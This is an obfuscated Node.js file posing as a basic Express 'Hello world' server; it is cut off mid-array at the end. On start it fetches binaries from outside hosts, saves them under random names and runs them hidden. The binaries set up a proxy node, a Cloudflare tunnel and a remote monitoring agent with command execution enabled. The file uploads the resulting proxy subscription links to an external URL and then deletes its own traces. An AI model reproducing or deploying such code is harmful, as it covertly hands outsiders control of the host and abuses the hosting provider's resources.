const _0x96b776=_0x9495;(function(_0x501efb,_0x371ffe){const _0x4d163b=_0x9495,_0x1740b7=_0x501efb();while(!![]){try{const _0xf3ac24=-parseInt(_0x4d163b(0x167))/0x1+-parseInt(_0x4d163b(0x14b))/0x2*(parseInt(_0x4d163b(0x157))/0x3)+parseInt(_0x4d163b(0x141))/0x4+-parseInt(_0x4d163b(0x143))/0x5*(-parseInt(_0x4d163b(0x179))/0x6)+-parseInt(_0x4d163b(0x1c8))/0x7+parseInt(_0x4d163b(0x104))/0x8+-parseInt(_0x4d163b(0x1ca))/0x9*(-parseInt(_0x4d163b(0x117))/0xa);if(_0xf3ac24===_0x371ffe)break;else _0x1740b7['push'](_0x1740b7['shift']());}catch(_0x430c11){_0x1740b7['push'](_0x1740b7['shift']());}}}(_0x56b8,0x51c73));const express=require(_0x96b776(0x120)),app=express(),axios=require(_0x96b776(0x11f)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x96b776(0x110)),exec=promisify(require(_0x96b776(0x118))[_0x96b776(0x1a5)]),{execSync}=require(_0x96b776(0x118)),UPLOAD_URL=process[_0x96b776(0x1a0)][_0x96b776(0x1b2)]||'',PROJECT_URL=process['env'][_0x96b776(0x147)]||'',AUTO_ACCESS=process[_0x96b776(0x1a0)][_0x96b776(0x159)]||![],FILE_PATH=process[_0x96b776(0x1a0)][_0x96b776(0x1ac)]||_0x96b776(0x132),SUB_PATH=process[_0x96b776(0x1a0)][_0x96b776(0x142)]||_0x96b776(0x166),PORT=process[_0x96b776(0x1a0)][_0x96b776(0x1b3)]||process['env'][_0x96b776(0x15e)]||0xbb8,UUID=process[_0x96b776(0x1a0)]['UUID']||_0x96b776(0x163),NEZHA_SERVER=process[_0x96b776(0x1a0)][_0x96b776(0x1af)]||'',NEZHA_PORT=process[_0x96b776(0x1a0)][_0x96b776(0x152)]||'',NEZHA_KEY=process['env'][_0x96b776(0x182)]||'',ARGO_DOMAIN=process[_0x96b776(0x1a0)][_0x96b776(0x1a1)]||_0x96b776(0x170),ARGO_AUTH=process[_0x96b776(0x1a0)][_0x96b776(0x16b)]||_0x96b776(0x162),ARGO_PORT=process[_0x96b776(0x1a0)][_0x96b776(0x123)]||0x1f41,CFIP=process[_0x96b776(0x1a0)][_0x96b776(0x194)]||_0x96b776(0x101),CFPORT=process['env'][_0x96b776(0x1a9)]||0x1bb,NAME=process['env'][_0x96b776(0x11b)]||_0x96b776(0x186);!fs[_0x96b776(0x154)](FILE_PATH)?(fs[_0x96b776(0x107)](FILE_PATH),console[_0x96b776(0x1aa)](FILE_PATH+_0x96b776(0x14e))):console['log'](FILE_PATH+_0x96b776(0x17a));function generateRandomName(){const _0x573d6e=_0x96b776,_0x55403f=_0x573d6e(0x11c);let _0x1c1426='';for(let _0x4d92c0=0x0;_0x4d92c0<0x6;_0x4d92c0++){_0x1c1426+=_0x55403f[_0x573d6e(0x196)](Math[_0x573d6e(0x124)](Math[_0x573d6e(0x1b0)]()*_0x55403f[_0x573d6e(0x134)]));}return _0x1c1426;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x9495(_0x27dc51,_0x1db1ff){_0x27dc51=_0x27dc51-0x101;const _0x56b87f=_0x56b8();let _0x9495e7=_0x56b87f[_0x27dc51];return _0x9495e7;}let npmPath=path[_0x96b776(0x12c)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x96b776(0x12c)](FILE_PATH,botName),subPath=path[_0x96b776(0x12c)](FILE_PATH,_0x96b776(0x135)),listPath=path[_0x96b776(0x12c)](FILE_PATH,_0x96b776(0x175)),bootLogPath=path[_0x96b776(0x12c)](FILE_PATH,'boot.log'),configPath=path[_0x96b776(0x12c)](FILE_PATH,'config.json');function deleteNodes(){const _0x51fae9=_0x96b776;try{if(!UPLOAD_URL)return;if(!fs[_0x51fae9(0x154)](subPath))return;let _0x50c424;try{_0x50c424=fs[_0x51fae9(0x125)](subPath,_0x51fae9(0x18a));}catch{return null;}const _0x1e0d61=Buffer[_0x51fae9(0x16e)](_0x50c424,_0x51fae9(0x129))[_0x51fae9(0x191)](_0x51fae9(0x18a)),_0x38473e=_0x1e0d61['split']('\x0a')['filter'](_0x4e96e2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x51fae9(0x12a)](_0x4e96e2));if(_0x38473e[_0x51fae9(0x134)]===0x0)return;return axios[_0x51fae9(0x13a)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x38473e}),{'headers':{'Content-Type':_0x51fae9(0x17f)}})[_0x51fae9(0x15a)](_0x193eb4=>{return null;}),null;}catch(_0x396605){return null;}}function cleanupOldFiles(){const _0x596e6c=_0x96b776;try{const _0x35afce=fs[_0x596e6c(0x19d)](FILE_PATH);_0x35afce[_0x596e6c(0x190)](_0x21889c=>{const _0x336449=_0x596e6c,_0x1e3d0f=path['join'](FILE_PATH,_0x21889c);try{const _0x5b28ae=fs[_0x336449(0x14a)](_0x1e3d0f);_0x5b28ae[_0x336449(0x16c)]()&&fs[_0x336449(0x1ab)](_0x1e3d0f);}catch(_0x53b9a8){}});}catch(_0xc2d490){}}app[_0x96b776(0x165)]('/',function(_0x23ea99,_0x133f36){const _0x5e02f8=_0x96b776;_0x133f36[_0x5e02f8(0x138)](_0x5e02f8(0x1a7));});async function generateConfig(){const _0x2e2234=_0x96b776,_0x518995={'log':{'access':_0x2e2234(0x148),'error':_0x2e2234(0x148),'loglevel':_0x2e2234(0x18f)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2e2234(0x1c7)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2e2234(0x13b),'dest':0xbba},{'path':_0x2e2234(0x127),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2e2234(0x130),'protocol':_0x2e2234(0x183),'settings':{'clients':[{'id':UUID}],'decryption':_0x2e2234(0x18f)},'streamSettings':{'network':_0x2e2234(0x11a),'security':_0x2e2234(0x18f)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2e2234(0x18f)},'streamSettings':{'network':'ws','security':_0x2e2234(0x18f),'wsSettings':{'path':_0x2e2234(0x13b)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2e2234(0x1cb),_0x2e2234(0x1a6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2e2234(0x130),'protocol':_0x2e2234(0x11d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2e2234(0x127)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2e2234(0x1cb),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2e2234(0x130),'protocol':_0x2e2234(0x1b7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2e2234(0x18f),'wsSettings':{'path':_0x2e2234(0x10a)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e2234(0x10f),_0x2e2234(0x1cb),_0x2e2234(0x1a6)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2e2234(0x161),'tag':_0x2e2234(0x108)},{'protocol':_0x2e2234(0x155),'tag':_0x2e2234(0x128)}]};fs[_0x2e2234(0x140)](path[_0x2e2234(0x12c)](FILE_PATH,_0x2e2234(0x197)),JSON[_0x2e2234(0x160)](_0x518995,null,0x2));}function getSystemArchitecture(){const _0x17ece0=_0x96b776,_0x370c2c=os[_0x17ece0(0x173)]();return _0x370c2c===_0x17ece0(0x1ad)||_0x370c2c===_0x17ece0(0x198)||_0x370c2c===_0x17ece0(0x1bd)?_0x17ece0(0x1ad):'amd';}function downloadFile(_0x51c6f8,_0x392997,_0x595230){const _0x2febe9=_0x96b776,_0x1d4d52=_0x51c6f8;!fs[_0x2febe9(0x154)](FILE_PATH)&&fs[_0x2febe9(0x107)](FILE_PATH,{'recursive':!![]});const _0x11f606=fs['createWriteStream'](_0x1d4d52);axios({'method':_0x2febe9(0x165),'url':_0x392997,'responseType':_0x2febe9(0x174)})[_0x2febe9(0x151)](_0xb8403f=>{const _0x532be5=_0x2febe9;_0xb8403f[_0x532be5(0x10e)][_0x532be5(0x10b)](_0x11f606),_0x11f606['on'](_0x532be5(0x137),()=>{const _0xce7f96=_0x532be5;_0x11f606[_0xce7f96(0x19b)](),console[_0xce7f96(0x1aa)](_0xce7f96(0x19e)+path[_0xce7f96(0x195)](_0x1d4d52)+_0xce7f96(0x1ae)),_0x595230(null,_0x1d4d52);}),_0x11f606['on']('error',_0x4d4385=>{const _0x9d4685=_0x532be5;fs[_0x9d4685(0x171)](_0x1d4d52,()=>{});const _0x48c95e=_0x9d4685(0x19e)+path['basename'](_0x1d4d52)+'\x20failed:\x20'+_0x4d4385[_0x9d4685(0x17c)];console[_0x9d4685(0x19a)](_0x48c95e),_0x595230(_0x48c95e);});})[_0x2febe9(0x15a)](_0x184c52=>{const _0x132b25=_0x2febe9,_0x12c9e8=_0x132b25(0x19e)+path[_0x132b25(0x195)](_0x1d4d52)+_0x132b25(0x10c)+_0x184c52['message'];console[_0x132b25(0x19a)](_0x12c9e8),_0x595230(_0x12c9e8);});}async function downloadFilesAndRun(){const _0x2e308e=_0x96b776,_0x257bb6=getSystemArchitecture(),_0x16d662=getFilesForArchitecture(_0x257bb6);if(_0x16d662[_0x2e308e(0x134)]===0x0){console[_0x2e308e(0x1aa)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3ed4ad=_0x16d662[_0x2e308e(0x18d)](_0x44e75e=>{return new Promise((_0x1c45e6,_0x1e4b97)=>{const _0x1e8abf=_0x9495;downloadFile(_0x44e75e[_0x1e8abf(0x177)],_0x44e75e[_0x1e8abf(0x184)],(_0x56a7af,_0x59c967)=>{_0x56a7af?_0x1e4b97(_0x56a7af):_0x1c45e6(_0x59c967);});});});try{await Promise[_0x2e308e(0x12b)](_0x3ed4ad);}catch(_0x3dd338){console[_0x2e308e(0x19a)]('Error\x20downloading\x20files:',_0x3dd338);return;}function _0x3d0797(_0x4b47b8){const _0x768949=_0x2e308e,_0x510acd=0x1fd;_0x4b47b8[_0x768949(0x190)](_0x54a94e=>{const _0x1f6f7b=_0x768949;fs[_0x1f6f7b(0x154)](_0x54a94e)&&fs['chmod'](_0x54a94e,_0x510acd,_0xcdc21f=>{const _0x1a526=_0x1f6f7b;_0xcdc21f?console[_0x1a526(0x19a)]('Empowerment\x20failed\x20for\x20'+_0x54a94e+':\x20'+_0xcdc21f):console['log']('Empowerment\x20success\x20for\x20'+_0x54a94e+':\x20'+_0x510acd['toString'](0x8));});});}const _0x4db52b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3d0797(_0x4db52b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x104e79=NEZHA_SERVER[_0x2e308e(0x1a3)](':')?NEZHA_SERVER['split'](':')[_0x2e308e(0x144)]():'',_0x480533=new Set([_0x2e308e(0x12f),_0x2e308e(0x172),_0x2e308e(0x169),_0x2e308e(0x145),_0x2e308e(0x126),_0x2e308e(0x18b)]),_0x2f4f1a=_0x480533[_0x2e308e(0x1bb)](_0x104e79)?_0x2e308e(0x12e):_0x2e308e(0x1c1),_0x550a51=_0x2e308e(0x17b)+NEZHA_KEY+_0x2e308e(0x15d)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2f4f1a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2e308e(0x140)](path[_0x2e308e(0x12c)](FILE_PATH,'config.yaml'),_0x550a51);const _0x4d63e4=_0x2e308e(0x180)+phpPath+_0x2e308e(0x14d)+FILE_PATH+_0x2e308e(0x1be);try{await exec(_0x4d63e4),console[_0x2e308e(0x1aa)](phpName+_0x2e308e(0x193)),await new Promise(_0x1dd5ab=>setTimeout(_0x1dd5ab,0x3e8));}catch(_0x5deebd){console['error'](_0x2e308e(0x1b6)+_0x5deebd);}}else{let _0x1adb1c='';const _0xfd3f02=['443',_0x2e308e(0x172),_0x2e308e(0x169),'2087',_0x2e308e(0x126),_0x2e308e(0x18b)];_0xfd3f02[_0x2e308e(0x1a3)](NEZHA_PORT)&&(_0x1adb1c=_0x2e308e(0x146));const _0x2c4fb3='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2e308e(0x1a8)+NEZHA_KEY+'\x20'+_0x1adb1c+_0x2e308e(0x13e);try{await exec(_0x2c4fb3),console[_0x2e308e(0x1aa)](npmName+_0x2e308e(0x193)),await new Promise(_0x2c9fc3=>setTimeout(_0x2c9fc3,0x3e8));}catch(_0x4bd60f){console['error'](_0x2e308e(0x1b1)+_0x4bd60f);}}}else console[_0x2e308e(0x1aa)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4c1bd1='nohup\x20'+webPath+_0x2e308e(0x187)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4c1bd1),console['log'](webName+_0x2e308e(0x193)),await new Promise(_0x412582=>setTimeout(_0x412582,0x3e8));}catch(_0x592998){console[_0x2e308e(0x19a)]('web\x20running\x20error:\x20'+_0x592998);}if(fs[_0x2e308e(0x154)](botPath)){let _0x323bdd;if(ARGO_AUTH[_0x2e308e(0x178)](/^[A-Z0-9a-z=]{120,250}$/))_0x323bdd=_0x2e308e(0x1bf)+ARGO_AUTH;else ARGO_AUTH[_0x2e308e(0x178)](/TunnelSecret/)?_0x323bdd=_0x2e308e(0x15f)+FILE_PATH+_0x2e308e(0x1a2):_0x323bdd=_0x2e308e(0x15c)+FILE_PATH+_0x2e308e(0x153)+ARGO_PORT;try{await exec(_0x2e308e(0x180)+botPath+'\x20'+_0x323bdd+_0x2e308e(0x11e)),console[_0x2e308e(0x1aa)](botName+_0x2e308e(0x193)),await new Promise(_0x5c37b5=>setTimeout(_0x5c37b5,0x7d0));}catch(_0x1c8842){console['error'](_0x2e308e(0x102)+_0x1c8842);}}await new Promise(_0x376b48=>setTimeout(_0x376b48,0x1388));}function getFilesForArchitecture(_0x36e159){const _0x212786=_0x96b776;let _0x125151;_0x36e159===_0x212786(0x1ad)?_0x125151=[{'fileName':webPath,'fileUrl':_0x212786(0x111)},{'fileName':botPath,'fileUrl':_0x212786(0x168)}]:_0x125151=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x212786(0x188)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x324484=_0x36e159===_0x212786(0x1ad)?_0x212786(0x18e):_0x212786(0x15b);_0x125151[_0x212786(0x1b5)]({'fileName':npmPath,'fileUrl':_0x324484});}else{const _0x39b55e=_0x36e159===_0x212786(0x1ad)?_0x212786(0x1b9):'https://amd64.ssss.nyc.mn/v1';_0x125151[_0x212786(0x1b5)]({'fileName':phpPath,'fileUrl':_0x39b55e});}}return _0x125151;}function argoType(){const _0x459ee3=_0x96b776;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x459ee3(0x1aa)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x459ee3(0x122))){fs['writeFileSync'](path[_0x459ee3(0x12c)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x6aaaff=_0x459ee3(0x1c2)+ARGO_AUTH['split']('\x22')[0xb]+_0x459ee3(0x19c)+path['join'](FILE_PATH,_0x459ee3(0x189))+_0x459ee3(0x10d)+ARGO_DOMAIN+_0x459ee3(0x156)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x459ee3(0x140)](path['join'](FILE_PATH,_0x459ee3(0x105)),_0x6aaaff);}else console[_0x459ee3(0x1aa)](_0x459ee3(0x133));}async function extractDomains(){const _0x58ec3a=_0x96b776;let _0x6668c8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x6668c8=ARGO_DOMAIN,console[_0x58ec3a(0x1aa)](_0x58ec3a(0x1b8),_0x6668c8),await _0x1afb44(_0x6668c8);else try{const _0x31ae38=fs[_0x58ec3a(0x125)](path[_0x58ec3a(0x12c)](FILE_PATH,_0x58ec3a(0x1b4)),_0x58ec3a(0x18a)),_0x4a0625=_0x31ae38[_0x58ec3a(0x16d)]('\x0a'),_0x3de3bc=[];_0x4a0625[_0x58ec3a(0x190)](_0x19461f=>{const _0x5d1f32=_0x58ec3a,_0x2a48aa=_0x19461f[_0x5d1f32(0x178)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2a48aa){const _0x1a26cc=_0x2a48aa[0x1];_0x3de3bc[_0x5d1f32(0x136)](_0x1a26cc);}});if(_0x3de3bc['length']>0x0)_0x6668c8=_0x3de3bc[0x0],console[_0x58ec3a(0x1aa)](_0x58ec3a(0x1ba),_0x6668c8),await _0x1afb44(_0x6668c8);else{console[_0x58ec3a(0x1aa)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x58ec3a(0x1b4)));async function _0x37e529(){const _0x3e115a=_0x58ec3a;try{process[_0x3e115a(0x158)]===_0x3e115a(0x17e)?await exec(_0x3e115a(0x109)+botName+_0x3e115a(0x112)):await exec(_0x3e115a(0x150)+botName[_0x3e115a(0x196)](0x0)+']'+botName[_0x3e115a(0x121)](0x1)+_0x3e115a(0x106));}catch(_0x30be2d){}}_0x37e529(),await new Promise(_0x1a98c7=>setTimeout(_0x1a98c7,0xbb8));const _0x5f3bc1=_0x58ec3a(0x15c)+FILE_PATH+_0x58ec3a(0x153)+ARGO_PORT;try{await exec(_0x58ec3a(0x180)+botPath+'\x20'+_0x5f3bc1+_0x58ec3a(0x11e)),console[_0x58ec3a(0x1aa)](botName+_0x58ec3a(0x193)),await new Promise(_0x47ce90=>setTimeout(_0x47ce90,0xbb8)),await extractDomains();}catch(_0x53d5b8){console[_0x58ec3a(0x19a)]('Error\x20executing\x20command:\x20'+_0x53d5b8);}}}catch(_0x53498f){console[_0x58ec3a(0x19a)]('Error\x20reading\x20boot.log:',_0x53498f);}async function _0x1c0bb7(){const _0x33c1a8=_0x58ec3a;try{const _0x964cce=await axios[_0x33c1a8(0x165)](_0x33c1a8(0x139),{'timeout':0xbb8});if(_0x964cce[_0x33c1a8(0x10e)]&&_0x964cce[_0x33c1a8(0x10e)]['country_code']&&_0x964cce['data'][_0x33c1a8(0x115)])return _0x964cce[_0x33c1a8(0x10e)][_0x33c1a8(0x13c)]+'_'+_0x964cce[_0x33c1a8(0x10e)][_0x33c1a8(0x115)];}catch(_0x17794){try{const _0x329deb=await axios[_0x33c1a8(0x165)](_0x33c1a8(0x113),{'timeout':0xbb8});if(_0x329deb[_0x33c1a8(0x10e)]&&_0x329deb[_0x33c1a8(0x10e)][_0x33c1a8(0x1c0)]===_0x33c1a8(0x181)&&_0x329deb[_0x33c1a8(0x10e)][_0x33c1a8(0x1c5)]&&_0x329deb['data'][_0x33c1a8(0x115)])return _0x329deb[_0x33c1a8(0x10e)]['countryCode']+'_'+_0x329deb['data'][_0x33c1a8(0x115)];}catch(_0x39e44f){}}return _0x33c1a8(0x176);}async function _0x1afb44(_0x39b8ef){const _0x42b575=await _0x1c0bb7(),_0x390427=NAME?NAME+'-'+_0x42b575:_0x42b575;return new Promise(_0x1145dd=>{setTimeout(()=>{const _0x29867a=_0x9495,_0x42eaf1={'v':'2','ps':''+_0x390427,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x29867a(0x18f),'net':'ws','type':_0x29867a(0x18f),'host':_0x39b8ef,'path':_0x29867a(0x185),'tls':_0x29867a(0x1cb),'sni':_0x39b8ef,'alpn':'','fp':_0x29867a(0x1bc)},_0x437aef=_0x29867a(0x164)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x39b8ef+_0x29867a(0x116)+_0x39b8ef+_0x29867a(0x199)+_0x390427+_0x29867a(0x114)+Buffer['from'](JSON['stringify'](_0x42eaf1))[_0x29867a(0x191)](_0x29867a(0x129))+_0x29867a(0x119)+UUID+'@'+CFIP+':'+CFPORT+_0x29867a(0x19f)+_0x39b8ef+_0x29867a(0x116)+_0x39b8ef+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x390427+_0x29867a(0x16a);console['log'](Buffer['from'](_0x437aef)[_0x29867a(0x191)](_0x29867a(0x129))),fs[_0x29867a(0x140)](subPath,Buffer['from'](_0x437aef)[_0x29867a(0x191)](_0x29867a(0x129))),console[_0x29867a(0x1aa)](FILE_PATH+_0x29867a(0x13f)),uploadNodes(),app[_0x29867a(0x165)]('/'+SUB_PATH,(_0x499f3e,_0x4d2a13)=>{const _0x516854=_0x29867a,_0xe5edb=Buffer[_0x516854(0x16e)](_0x437aef)['toString'](_0x516854(0x129));_0x4d2a13[_0x516854(0x16f)]('Content-Type',_0x516854(0x12d)),_0x4d2a13[_0x516854(0x138)](_0xe5edb);}),_0x1145dd(_0x437aef);},0x7d0);});}}async function uploadNodes(){const _0x2c94c4=_0x96b776;if(UPLOAD_URL&&PROJECT_URL){const _0x49bcf6=PROJECT_URL+'/'+SUB_PATH,_0x40f9c4={'subscription':[_0x49bcf6]};try{const _0x16f48e=await axios[_0x2c94c4(0x13a)](UPLOAD_URL+_0x2c94c4(0x13d),_0x40f9c4,{'headers':{'Content-Type':_0x2c94c4(0x17f)}});return _0x16f48e&&_0x16f48e['status']===0xc8?(console[_0x2c94c4(0x1aa)]('Subscription\x20uploaded\x20successfully'),_0x16f48e):null;}catch(_0x41ccd8){if(_0x41ccd8[_0x2c94c4(0x131)]){if(_0x41ccd8[_0x2c94c4(0x131)][_0x2c94c4(0x1c0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2c94c4(0x154)](listPath))return;const _0x1a91c1=fs[_0x2c94c4(0x125)](listPath,_0x2c94c4(0x18a)),_0x619a9c=_0x1a91c1['split']('\x0a')[_0x2c94c4(0x149)](_0x31bf52=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2c94c4(0x12a)](_0x31bf52));if(_0x619a9c['length']===0x0)return;const _0x1ad4ac=JSON[_0x2c94c4(0x160)]({'nodes':_0x619a9c});try{const _0x223a4e=await axios[_0x2c94c4(0x13a)](UPLOAD_URL+_0x2c94c4(0x14f),_0x1ad4ac,{'headers':{'Content-Type':_0x2c94c4(0x17f)}});return _0x223a4e&&_0x223a4e[_0x2c94c4(0x1c0)]===0xc8?(console['log'](_0x2c94c4(0x17d)),_0x223a4e):null;}catch(_0x3da31d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4dfc5b=_0x9495,_0x4c007e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4c007e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4c007e[_0x4dfc5b(0x136)](phpPath);process['platform']===_0x4dfc5b(0x17e)?exec(_0x4dfc5b(0x1c9)+_0x4c007e[_0x4dfc5b(0x12c)]('\x20')+'\x20>\x20nul\x202>&1',_0x2ea647=>{const _0x5819bb=_0x4dfc5b;console[_0x5819bb(0x1c6)](),console[_0x5819bb(0x1aa)](_0x5819bb(0x1c4)),console[_0x5819bb(0x1aa)](_0x5819bb(0x1a4));}):exec(_0x4dfc5b(0x103)+_0x4c007e['join']('\x20')+_0x4dfc5b(0x192),_0x2cf5eb=>{const _0x5d4f12=_0x4dfc5b;console[_0x5d4f12(0x1c6)](),console['log'](_0x5d4f12(0x1c4)),console[_0x5d4f12(0x1aa)](_0x5d4f12(0x1a4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2f1891=_0x96b776;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f1891(0x1aa)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3f616f=await axios['post'](_0x2f1891(0x18c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f1891(0x17f)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x3f616f;}catch(_0x330c91){return console[_0x2f1891(0x19a)](_0x2f1891(0x1c3)+_0x330c91['message']),null;}}async function startserver(){const _0x3b5af7=_0x96b776;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x277f45){console[_0x3b5af7(0x19a)]('Error\x20in\x20startserver:',_0x277f45);}}startserver()[_0x96b776(0x15a)](_0x4673ce=>{const _0x11a039=_0x96b776;console[_0x11a039(0x19a)]('Unhandled\x20error\x20in\x20startserver:',_0x4673ce);}),app[_0x96b776(0x14c)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));function _0x56b8(){const _0x473c00=['all','join','text/plain;\x20charset=utf-8','true','443','127.0.0.1','response','./tmp','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','length','sub.txt','push','finish','send','https://ipapi.co/json/','post','/vless-argo','country_code','/api/add-subscriptions','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','writeFileSync','111820VcDGOH','SUB_PATH','488665TbWqmq','pop','2087','--tls','PROJECT_URL','/dev/null','filter','statSync','72038cxyEpt','listen','\x20-c\x20\x22','\x20is\x20created','/api/add-nodes','pkill\x20-f\x20\x22[','then','NEZHA_PORT','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','existsSync','blackhole','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','51eRrRtu','platform','AUTO_ACCESS','catch','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','PORT','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','stringify','freedom','eyJhIjoiMzEwZDgyNmFmOTM2ZGU2MjY1ZTQzOGEwZTBiMDk0MTAiLCJ0IjoiMWYxNmYzMWItYzY3YS00YzQyLTk0MTMtZGIyMmM1NDAzODE1IiwicyI6Ik5USTFaR0ppWmpndFl6UTJNQzAwWmpkakxXSmhNRGN0TVRNNVpESmlPVFUyT1ROaSJ9','59711bfe-e558-4d54-9a21-26c8fe030562','\x0avless://','get','3105','252765RnzjBI','https://arm64.ssss.nyc.mn/bot','2096','\x0a\x20\x20\x20\x20','ARGO_AUTH','isFile','split','from','set','ag3105.gu26.de5.net','unlink','8443','arch','stream','list.txt','Unknown','fileName','match','36ByQmzt','\x20already\x20exists','\x0aclient_secret:\x20','message','Nodes\x20uploaded\x20successfully','win32','application/json','nohup\x20','success','NEZHA_KEY','vless','fileUrl','/vmess-argo?ed=2560','ag3105','\x20-c\x20','https://amd64.ssss.nyc.mn/bot','tunnel.json','utf-8','2053','https://oooo.serv00.net/add-url','map','https://arm64.ssss.nyc.mn/agent','none','forEach','toString','\x20>/dev/null\x202>&1','\x20is\x20running','CFIP','basename','charAt','config.json','arm64','&path=%2Fvless-argo%3Fed%3D2560#','error','close','\x0a\x20\x20credentials-file:\x20','readdirSync','Download\x20','?security=tls&sni=','env','ARGO_DOMAIN','/tunnel.yml\x20run','includes','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','exec','quic','Hello\x20world!','\x20-p\x20','CFPORT','log','unlinkSync','FILE_PATH','arm','\x20successfully','NEZHA_SERVER','random','npm\x20running\x20error:\x20','UPLOAD_URL','SERVER_PORT','boot.log','unshift','php\x20running\x20error:\x20','trojan','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/v1','ArgoDomain:','has','firefox','aarch64','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','status','false','\x0a\x20\x20tunnel:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','App\x20is\x20running','countryCode','clear','xtls-rprx-vision','2134342etgAcT','del\x20/f\x20/q\x20','2261421riLzlc','tls','cdns.doon.eu.org','Error\x20executing\x20command:\x20','rm\x20-rf\x20','3104528KvFgiT','tunnel.yml','\x22\x20>\x20/dev/null\x202>&1','mkdirSync','direct','taskkill\x20/f\x20/im\x20','/trojan-argo','pipe','\x20failed:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','data','http','util','https://arm64.ssss.nyc.mn/web','.exe\x20>\x20nul\x202>&1','http://ip-api.com/json/','\x0a\x0avmess://','org','&fp=firefox&type=ws&host=','20bkmsfq','child_process','\x0a\x0atrojan://','tcp','NAME','abcdefghijklmnopqrstuvwxyz','vmess','\x20>/dev/null\x202>&1\x20&','axios','e